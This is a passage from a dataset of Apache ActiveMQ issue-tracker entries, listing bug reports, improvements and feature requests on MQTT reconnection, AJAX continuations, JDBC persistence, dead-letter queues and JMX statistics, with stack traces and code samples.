If you don"t wish to retain non delivered or expired persistent messages then it should be possible to easily disable the use of the dlq.the discarding plugin will purge it, but that is not ideal.Preferable is something like:<destinationPolicy>  <policyMap>    <policyEntries>      <policyEntry queue=">" ..>        <deadLetterStrategy><discarding/></deadLetterStrategy>    ...
issueID:AMQ-4585
type:Bug
changed files:
texts:MQTT BlockingConnection.receive fails when receiving pending messages after reconnect without cleaning session
The system throws at least three different types of exceptions when a subscriber receives the first pending message without cleaning the session. The test case corresponds to receiving several messages from a publisher then closing the subscriber connection and finally reconnecting with setCleanSession(false) and attempt to read the messages published while the subscriber was disconnected.The exceptions thrown:java.net.ProtocolException: Command from server contained an invalid message id: 1 at org.fusesource.mqtt.client.CallbackConnection.completeRequest(CallbackConnection.java:723) at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:762) at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51) at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)java.lang.ArrayIndexOutOfBoundsException: 0 at org.fusesource.mqtt.codec.MessageSupport$AckBase.decode(MessageSupport.java:81) at org.fusesource.mqtt.codec.PUBREC.decode(PUBREC.java:40) at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:749) at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51) at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)java.net.ProtocolException: Unexpected MQTT command type: 0 at org.fusesource.mqtt.client.CallbackConnection.processFrame(CallbackConnection.java:775) at org.fusesource.mqtt.client.CallbackConnection.access$1500(CallbackConnection.java:51) at org.fusesource.mqtt.client.CallbackConnection$6.onTransportCommand(CallbackConnection.java:392) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)No message is shown in the server. The problem doesn"t occur always but most of the times the first reconnection attempt is made. With setCleanSession(true) the system works fine.Code sample (publisher, permanently running):MQTT mqtt = new MQTT();mqtt.setHost(url);mqtt.setUserName(user);mqtt.setPassword(password);mqtt.setClientId("test_id");int i = 0;while (true) { BlockingConnection connection = mqtt.blockingConnection(); connection.connect(); String message = "TestMessage: " + i; connection.publish("TopicA", message.getBytes(), QoS.AT_LEAST_ONCE, false); System.out.println("Vendor: Sent message."); Thread.sleep(2500); connection.disconnect(); Thread.sleep(2500); i++;}Code sample (subscriber, fails multiple times when restarting after the connection is closed):BlockingConnection connection = null;try {    MQTT = new MQTT();    mqtt.setHost(url);    mqtt.setClientId(clientId);    mqtt.setUserName(user);    mqtt.setPassword(password);    mqtt.setCleanSession(false);    connection = mqtt.blockingConnection();    connection.connect();    Topic[] topics = {new Topic("TopicA", QoS.EXACTLY_ONCE)};    byte[] qoses = connection.subscribe(topics);    int numMessages = 1;    while (numMessages % 10 != 0) {        Message message = connection.receive();        byte[] payload = message.getPayload();        String messageContent = new String(payload);        System.out.println("Received message from topic: " + message.getTopic() + " Message content: " + messageContent);        message.ack();        numMessages++;    }} finally {    if(connection != null) {        try {            connection.disconnect();        } catch (Exception e) {            // TODO Auto-generated catch block            e.printStackTrace();        }    }}The test failed when using the current fusesource client (1.5) on ActiveMQ 5.9, on Mosquitto mqtt the code works correctly
issueID:AMQ-4587
type:Bug
changed files:
texts:AMQP to JMS transformer fails to properly map AMQP specific property types like UnsignedInteger
None
issueID:AMQ-4588
type:Bug
changed files:IdGenerator.java
texts:org.apache.activemq.util.IdGenerator calls non-configurable new ServerSocket(0);
In order to have the AMQ client run on OpenShift the IdGenerator call "new ServerSocket(0);" needs to be configurable to be avoided. OpenShift only allows binding to a specific, provided, unique loopback address and a limited set of ports. Ideally there would be a configuration option that allows the stub prefix to be set via a JVM param. The current logic doesn"t break OpenShift as the PermissionDenied exception is caught and swallowed but the stack trace is ugly.
issueID:AMQ-4589
type:Bug
changed files:AjaxListener.java
MessageListenerServlet.java
texts:Race condition in AjaxListener causes lost messages
Running activemq-web under a container that supports Servlet 3, there is a race condition when resuming continuations that leads to lost messages because the same continuation is resumed multiple times and the second time around the undelivered_message attribute is overwritten. Here"s an example debug log of the issue under Jetty:2013-06-19 10:46:51,340 DEBUG o.a.a.web.MessageListenerServlet   - doMessage timeout=250002013-06-19 10:46:51,350 DEBUG o.a.a.web.MessageListenerServlet   - received null from ActiveMQMessageConsumer { value=ID:deapp0313-52345-1371228095770-3:126:1:1, started=true }2013-06-19 10:46:51,350 DEBUG o.a.a.web.MessageListenerServlet   - Suspending continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a2013-06-19 10:46:53,053 DEBUG org.apache.activemq.web.AjaxListener   - message is ActiveMQTextMessage {commandId = 4419, responseRequired = true, messageId = ID:deapp0313-52345-1371228095770-1:1:1:1:4415, originalDestination = null, originalTransactionId = null, producerId = ID:deapp0313-52345-1371228095770-1:1:1:1, destination = topic://W2ETopic, transactionId = null, expiration = 0, timestamp = 1371631612606, arrival = 0, brokerInTime = 1371631612628, brokerOutTime = 1371631612629, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@1e5bc429, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {instance=1796}, readOnlyProperties = true, readOnlyBody = true, droppable = false, text = {"instance":{"instanceId":1796,"changeNo":217...nput":true}}}2013-06-19 10:46:53,062 DEBUG org.apache.activemq.web.AjaxListener   - Resuming suspended continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a2013-06-19 10:46:53,063 DEBUG org.apache.activemq.web.AjaxListener   - message for ActiveMQMessageConsumer { value=ID:deapp0313-52345-1371228095770-3:126:1:1, started=true } continuation=org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a2013-06-19 10:46:53,064 DEBUG org.apache.activemq.web.AjaxListener   - message is ActiveMQTextMessage {commandId = 4420, responseRequired = true, messageId = ID:deapp0313-52345-1371228095770-1:1:1:1:4416, originalDestination = null, originalTransactionId = null, producerId = ID:deapp0313-52345-1371228095770-1:1:1:1, destination = topic://W2ETopic, transactionId = null, expiration = 0, timestamp = 1371631612644, arrival = 0, brokerInTime = 1371631612644, brokerOutTime = 1371631613022, correlationId = null, replyTo = null, persistent = true, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = org.apache.activemq.util.ByteSequence@1aab6f51, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {instance=1796}, readOnlyProperties = true, readOnlyBody = true, droppable = false, text = {"instance":{"instanceId":1796,"changeNo":217...nput":true}}}2013-06-19 10:46:53,064 DEBUG org.apache.activemq.web.AjaxListener   - Resuming suspended continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a2013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - GET client=org.apache.activemq.web.AjaxWebClient@7c00281 session=c5qseeifcc9l1n49e7ivdx3at clientId=w2e-gui-0.18586184200830758 uri=/amq query=timeout=120000&d=1371631611528&r=0.4084213834721595&clientId=w2e-gui-0.185861842008307582013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - doMessage timeout=250002013-06-19 10:46:53,065 DEBUG o.a.a.web.MessageListenerServlet   - sending pre-existing message2013-06-19 10:46:53,066 DEBUG o.a.a.web.MessageListenerServlet   - Send 0 unconsumed messages2013-06-19 10:46:53,065 ERROR org.apache.activemq.web.AjaxListener   - Error receiving message java.lang.IllegalStateException: REDISPATCHED,resumedjava.lang.IllegalStateException: REDISPATCHED,resumed at org.eclipse.jetty.server.HttpChannelState.dispatch(HttpChannelState.java:335) ~[jetty-server-9.0.3.v20130506.jar:9.0.3.v20130506] at org.eclipse.jetty.server.AsyncContextState.dispatch(AsyncContextState.java:109) ~[jetty-server-9.0.3.v20130506.jar:9.0.3.v20130506] at org.eclipse.jetty.continuation.Servlet3Continuation.resume(Servlet3Continuation.java:186) ~[jetty-continuation-9.0.3.v20130506.jar:9.0.3.v20130506] at org.apache.activemq.web.AjaxListener.onMessageAvailable(AjaxListener.java:74) ~[activemq-web-5.8.0.jar:5.8.0] at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1343) [activemq-client-5.8.0.jar:5.8.0] at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) [activemq-client-5.8.0.jar:5.8.0] at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) [activemq-client-5.8.0.jar:5.8.0] at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) [activemq-client-5.8.0.jar:5.8.0] at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) [activemq-client-5.8.0.jar:5.8.0] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110) [na:1.7.0_07] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603) [na:1.7.0_07] at java.lang.Thread.run(Thread.java:722) [na:1.7.0_07]2013-06-19 10:46:53,068 DEBUG o.a.a.web.MessageListenerServlet   - Continuation org.eclipse.jetty.continuation.Servlet3Continuation@73d4a75a completed.The root of the race is that the code uses isSuspended() to check whether a continuation has been resumed, but resume() only resets isSuspended() after the resume request has been processed in the servlet engine. The race-free way to check whether is has been resumed is to check isResumed(), see attached patch.
issueID:AMQ-459
type:New Feature
changed files:PolicyEntry.java
DispatchPolicy.java
StrictOrderDispatchPolicy.java
RoundRobinDispatchPolicy.java
FixedSizedSubscriptionRecoveryPolicy.java
DeadLetterStrategy.java
SharedDeadLetterStrategy.java
Topic.java
Queue.java
TimedSubscriptionRecoveryPolicy.java
SimpleDispatchPolicy.java
PrefetchSubscription.java
Destination.java
IndividualDeadLetterStrategy.java
texts:allow either a shared, global DLQ to be used or to have one per destination or one per wildcard (configurable on a per destintation/wildcard basis)
the <policyEntry> can now have a <deadLetterStrategy> property which can be either <sharedDeadLetterStrategy> or an <individualDeadLetterStrategy>
issueID:AMQ-4591
type:Bug
changed files:CronParser.java
texts:CronParser bug on getNextScheduledTime to handle the once per minute case "* * * * *"
There is a Bug on handle the once per minute case.For the cronentry: "* * * * *" The Next Scheduled time is not the top of the next minute.Instead, is the current Time plus 60 secondsThe problem is that the code is trying to set the precision at seconds, but the precision must have to be at minutes. You can check the patch attached to see the change required to fix this issue.
issueID:AMQ-4592
type:Bug
changed files:
texts:MySQL 5.1.25 change driver name
It"s changed to "MySQL Connector Java"http://dev.mysql.com/doc/relnotes/connector-j/en/news-5-1-25.htmlWe need to support this name in adapter selection
issueID:AMQ-4593
type:Improvement
changed files:
texts:Upgrade Snappy Java
Version 1.0.4 we use in osgi env doesn"t work properly on Java 7.
issueID:AMQ-4594
type:New Feature
changed files:
texts:Replace web console with hawtio
Our administration web console has come to age and we should replace with hawtio (http://hawt.io) project. Of course, we should make sure that ActiveMQ plugin is feature compatible with current console.hawtio provides lots of extra capabilities over the old web console; we can send messages, move messages, delete messages and easily replay DLQ messages; together with visualising producer/consumer flows and providing real time metrics and charting on destinations. Plus hawtio is much smaller than the old web console; we can also use the hawtio console remotely to connect to other brokers and JVMs which just contain the tiny jolokia java agent
issueID:AMQ-4595
type:Bug
changed files:
texts:QueueBrowser hangs when browsing large queues
When trying to browse a queue with a QueueBrowser, the browsing will hang and never complete. This appears to happen only with "a lot" of message in the queue. 1000 messages works correctly, but 10000 hangs.I have attached a unit test that exhibits the problem. Change the "messageToSend" variable in the test method to see the difference between small queue size and large queue size. I"ve attached the unit test code as well as the output from one of the runs with 10000 messages.
issueID:AMQ-4596
type:Bug
changed files:
texts:AMQP: JMSSecurityExceptions are not propagated back to QPID client on authentication failures
I created a broker using a config file that contained:<simpleAuthenticationPlugin>    <users>        <authenticationUser username="system" password="systemPassword" groups="users,admins"/>       <authenticationUser username="user" password="userPassword" groups="users"/>       <authenticationUser username="guest" password="guestPassword" groups="guests"/>    </users></simpleAuthenticationPlugin>With a normal client, the following code will throw a JMSSecurityException on the connection.start(), or connection.createProducer(), or I assume on anything you do with connection.  The same is true if I call createConnection with an unknown user, or a known user and invalid password    ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("vm://localhost");    Connection connection = factory.createConnection();    connection.start();When I use the QPID client though, I don"t get the JMSSecurityException.  In the logs I can see the exception being thrown by the broker, but it doesn"t get propagated back to the client, even if I add an exception listener.  The code below will continue along until it hangs on the session.CreateProducer() call.    ConnectionFactoryImpl factory = new ConnectionFactoryImpl("localhost", port, "admin", "password");     Connection connection = factory.createConnection();     connection.setExceptionListener(new ExceptionListener() {         @Override         public void onException(JMSException exception) {             exception.printStackTrace();         }     });     Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);     QueueImpl queue = new QueueImpl("queue://txqueue");     MessageProducer p = session.createProducer(queue);I will attach a unit test that reproduces this.
issueID:AMQ-4598
type:Bug
changed files:
texts:Negative JMX QueueSize attribute in due to purging a queue
If you purge a queue that has a bunch of messages prefetched you may end up with a negative QueueSize in JMX as the prefetched messages get acked after the purge. This behavior should be considered a bug as many users depend on these JMX statistics.
issueID:AMQ-4599
type:Bug
changed files:
texts:Only package the pure java LevelDB driver by default
None
issueID:AMQ-460
type:Bug
changed files:
texts:bug in redelivery logic in JMS client
It seems that after the first message is redelivered the maximum amount of times (and then sent to the DLQ), rollbacks to future messages never actually rollback.See the DeadLettterTest case in activemq-core.
issueID:AMQ-4604
type:Bug
changed files:
texts:Update QPID Client version to 0.22
0.22 is the latest released version.
issueID:AMQ-4605
type:Bug
changed files:
texts:AMQ2149KahaDBTest is redundant
AMQ2149KahaDBTest extends AMQ2149Test, but doesn"t change anything.  It used to override configurePersistenceAdapter(), but that has been commented out as KahaDB is the default persistence adapter.We should just remove this test.
issueID:AMQ-4606
type:Bug
changed files:
texts:BrokerXmlConfigStartTest  fails on activemq-leveldb-replicating.xml
This fails with the following:java.lang.IllegalStateException: BeanFactory not initialized or already closed - call "refresh" before accessing beans via the ApplicationContext at org.springframework.context.support.AbstractRefreshableApplicationContext.getBeanFactory(AbstractRefreshableApplicationContext.java:172) at org.springframework.context.support.AbstractApplicationContext.destroyBeans(AbstractApplicationContext.java:1078) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:480) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52) at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:101) at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:101) at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:65) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:85) at org.apache.activemq.config.BrokerXmlConfigStartTest.testStartBrokerUsingXmlConfig1(BrokerXmlConfigStartTest.java:84)
issueID:AMQ-4607
type:Improvement
changed files:
texts:network connectors - new messageTTL and consumerTTL - split usage of networkTTL for mesh topology
currently networkTTL in a networkConnector (default=1) means that a message can go one hop and demand (or info about a consumer) can go one hop.In a network (A<>B) messages and consumers can flow.In a linear network (A<>B<>C) networkTTL needs to be 2 for messages and consumers to flow two hops from A to C.In a mesh topology, (A<>B<>C<A>) a networkTTL=1 for consumers makes sense because there is at most one hop. However for messages, networkTTL > 1 is necessary if consumers need to hop around between brokers. Imagine a consumer on A which pulls messages to A from B, then the consumer moves to C, messages now need to hop again from A to C. This can repeat, essentially messageTTL(networkTTL) needs to be infinite.With consumerTTL > 1 in a mesh, managing demand for proxy (demand) consumers and proxy proxy consumers becomes very difficult.
issueID:AMQ-4609
type:Bug
changed files:BrokerService.java
texts:NetworkConnector MBean registered early, causing wrong MBean server to be started
If network connectors are added before JMX management context is created a default one will be created. So if we configure a context with different port, two will be created in total. We should register network connectors after broker is initialised and context is properly created.
issueID:AMQ-461
type:Bug
changed files:
texts:m2 poms need patches
None
issueID:AMQ-4610
type:Bug
changed files:
texts:ActiveMQ shows icon in Dock on MacOSX (with solution)
On Mac activemq shows an really annoying icon in the doc.Please add the following options to the startup script to get rid of it:-Djava.awt.headless=true
issueID:AMQ-4617
type:New Feature
changed files:
texts:Enable MQTT over WebSocket protocol
We can do support multiple protocols over ws transport easily. It"d be good to provide mqtt support.
issueID:AMQ-4621
type:Improvement
changed files:AbortSlowAckConsumerStrategy.java
AbortSlowAckConsumerStrategyViewMBean.java
AbortSlowAckConsumerStrategyView.java
texts:Provide a polling SlowConsumerPolicy that uses LastAck time on a sub
The existing AbortSlowConsumer policy is event driven. It depends on a consumer slow event that is triggered when the prefetch is reached and there are subsequent dispatches.With prefetch=0|1 there still needs to be throughput to determine that the consumer is slow so one message can be pending if there are no new messages to sent to the destination.Providing an alternative implementation that will periodically poll consumers for their last ack time will be more deterministic. The slow advisory may never fire, but the consumer will get aborted if it does not ack in a timely manner.if lastAckTime exceeds the max and there are dispatched messages it can be a candidate for removal.Optionally lastAckTime exceeding and no dispatched messages can be a way to remove idle consumers. Not sure if that is necessary.
issueID:AMQ-4623
type:Bug
changed files:
texts:InstallService.bat, UninstallService.bat running failed on explorer(win32,64)
InstallService.bat, UninstallService.bat running failed on explorer(win32,64)
issueID:AMQ-4625
type:Bug
changed files:
texts:XPP Pull parser lib missing from AMQ distro
the XPP XML Pull parser used in XStream is missing from lib/optional in the 5.8 distro tar and zip files.
issueID:AMQ-4628
type:Bug
changed files:activemq-jdbc-performance.xml
ProducerTool.java
Statements.java
build.xml
DefaultJDBCAdapter.java
texts:Improve Performance of JDBC store with large number of messages
Currently JDBC store doesn"t behave well when there"s a huge backlog of messages (like 1 million or more). With some SQL improvements, we can make it work properly for this use case as well.
issueID:AMQ-4629
type:Bug
changed files:MessageServlet.java
texts:REST MessageServlet swallowing Messages on high traffic topic
Polling an amq topic via REST, MessageServlet:on very fast message arrival the MessageAvalableListener is fired multiple times and then overwrites the message attribute of the Continuation.This leads to messages getting lost.
issueID:AMQ-463
type:Improvement
changed files:
texts:add test case to ensure that the InvalidClientIDException is thrown if multiple clients connect to the same broker using the same clientID
None
issueID:AMQ-4634
type:Bug
changed files:
texts:Rar losing messages when there is a XA trx timeout (jboss)
ActiveMQ does a trx commit when there is a transaction timeout (EJBTransactionRolledbackException). In this way we are losing messages when there is any timeout.We have seen that the activemq connections are enlist in XA.The attribute transactionContext from ActiveMQSession class has the global transaction reference (xid) before calling the MDB (messageListener.onMessage(message)).When the timeout is reached and the RuntimeException is throwned, the transactionContext losed the xid reference.Later, when ActiveMQSession call the method transactionContext.isInXATransaction() the result is false because there is no xid reference.This situation only happened when the MDB calls other EJB (Stateless) with CMT - TransactionAttributeType.REQUIRES_NEW, and the exception is throwed inside the Stateless.I"ve tried to reproduce this without calling the stateless ejb but it works well.The ActiveMQSession class should retain the original transactionContext.
issueID:AMQ-4635
type:New Feature
changed files:ProducerViewMBean.java
DestinationViewMBean.java
ProducerView.java
BrokerService.java
Topic.java
Queue.java
TransportConnection.java
DestinationStatistics.java
ProducerBrokerExchange.java
BaseDestination.java
DestinationView.java
texts:Expose producer flow control statistics via JMX
When using JMX to investigate a broker"s state, I would like to see explicit information on producer flow control. In particular, I think it would be useful to expose information such as: Per producer   Whether the producer is currently blocked by flow control, and on what topic (or topics, if that"s possible)  How much time a producer spends waiting  Percent of sends that involve flow control   Per topic   Average time a publish blocks due to flow control  Publishers currently under flow control for the topic  Percent of message sends on this topic that involve flow control
issueID:AMQ-4636
type:Bug
changed files:
texts:JDBCPersistence DB stopped during message send; JMSException is sent back to client rather than shutting down connection
Broker is configured to use JDBCIOExceptionHandler.When the JDBCPersistence DB is stopped during a message send the broker returns the following javax.jms.JMSException back to the client rather than closing the connection.This results in the client having to deal with the exception instead of the failover transport having to deal with a connection loss and redeliver the message. Failover transport and transport connection loss seems to be the approach used when other SQL exceptions are thrown.Exception received on client side:javax.jms.JMSException: ORA-01089: immediate shutdown in progress - no operations are permitted        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1319)        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1798)        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289)        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224)        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)        at com.acme.MyPublisher.doIt(MyPublisher.java:50)        at com.acme.MyPublisher.main(MyPublisher.java:26)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)        at java.lang.Thread.run(Thread.java:662)Caused by: java.io.IOException: ORA-01089: immediate shutdown in progress - no operations are permitted        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:141)        at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:129)        at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:327)        at org.apache.activemq.store.memory.MemoryTransactionStore$2.asyncAddTopicMessage(MemoryTransactionStore.java:190)        at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:471)        at org.apache.activemq.broker.region.Topic.send(Topic.java:435)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:406)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:392)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:499)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:749)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)        ... 1 moreCaused by: java.lang.Throwable: java.sql.BatchUpdateException: ORA-01089: immediate shutdown in progress - no operations are permitted        at oracle.jdbc.driver.OraclePreparedStatement.executeBatch(OraclePreparedStatement.java:10296)        at oracle.jdbc.driver.OracleStatementWrapper.executeBatch(OracleStatementWrapper.java:216)        at com.mchange.v2.c3p0.impl.NewProxyPreparedStatement.executeBatch(NewProxyPreparedStatement.java:1723)        at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:106)        at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:84)        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:132)Will attach a test case soon.
issueID:AMQ-4637
type:Improvement
changed files:
texts:Add cause property to DLQ message that exceed redelivery policy, ref the policy
To aid browsing messages in the dlq, populate the cause property for messages that fail a redelivery policy. add a ref to the policy so see detail of what failed.
issueID:AMQ-4638
type:Bug
changed files:BrokerService.java
texts:Tell broker to use only the space it thinks it has
Currently ActiveMQ logs a warning message - but it doesn"t alter the values if less space is available than configured.
issueID:AMQ-464
type:Bug
changed files:
texts:2 broker network seems to loose messages
For background: http://forums.logicblaze.com/posts/list/116.pageI"ve created a test case which demonstrates the issue in the assembly module...TwoBrokerTopicSendReceiveLotsOfMessagesUsingTcpTest.javaYou might want to enable log4j logging to see the messages that are received
issueID:AMQ-4640
type:Bug
changed files:
texts:We should run JoramJmsTests with amqp+nio
We should run the JoramJmsTests using amqp+nio in order to get test coverage of AmqpNioTransport and AmqpNioTransportFactory.I will attach a patch.
issueID:AMQ-4641
type:Bug
changed files:
texts:JoramJmsTest QueryBrowserTest fails when run with amqp+nio
If you run QueryBrowserTest using amqp+nio, you get the following:Tests run: 2, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 5.166 sec <<< FAILURE!testSenderBrowser(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest)  Time elapsed: 3.053 sec  <<< FAILURE!junit.framework.AssertionFailedError: null at junit.framework.Assert.fail(Assert.java:55) at junit.framework.Assert.assertTrue(Assert.java:22) at junit.framework.Assert.assertTrue(Assert.java:31) at org.objectweb.jtests.jms.conform.queue.QueueBrowserTest.testSenderBrowser(QueueBrowserTest.java:103)testBrowserWithMessageSelector(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest)  Time elapsed: 2.051 sec  <<< FAILURE!junit.framework.AssertionFailedError: expected:<1> but was:<0> at junit.framework.Assert.fail(Assert.java:57) at junit.framework.Assert.failNotEquals(Assert.java:329) at junit.framework.Assert.assertEquals(Assert.java:78) at junit.framework.Assert.assertEquals(Assert.java:234) at junit.framework.Assert.assertEquals(Assert.java:241) at org.objectweb.jtests.jms.conform.queue.QueueBrowserTest.testBrowserWithMessageSelector(QueueBrowserTest.java:142)This may be similar to: https://issues.apache.org/jira/browse/AMQ-4376
issueID:AMQ-4643
type:Bug
changed files:
texts:JDBCPersistence DB stopped during message send with JDBCIOExceptionHandler configured; IOException/SQLException is sent back (sometimes) to the client before the transport connector is shutdown
This related to AMQ-4636 JIRA for gtully"s second point in comment https://issues.apache.org/jira/browse/AMQ-4636?focusedCommentId=13712196&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13712196Scenario: Producer sending persistent message (no transaction) JDBCIOExceptionHandler is configured the underlying DB is shutdown during message sendResult:One of two outcomes can happen:1) the broker sends the an IOException/SQLException wrapped in a JMSException (below) back to the client and then shuts down the transport connectors.2) the broker shuts down the transport connector when the IOException/SQLException is encountered.Expected behavior:As the JDBCIOHandler is configured which is handling the SQL exception, it would be good if the transport connectors were shutdown and no IOException/SQLException is reported to producer.2013-07-19 15:22:05,436 [main           ] - ERROR pDBDuringProducerSendTopicTest - unexpected exception caughtjavax.jms.JMSException: Database &apos;target/derbydb_15&apos; not found. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1319) at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1809) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224) at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241) at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.sendMessage(StopDBDuringProducerSendTopicTest.java:150) at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.testProducerWithDBShutdown(StopDBDuringProducerSendTopicTest.java:127) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at 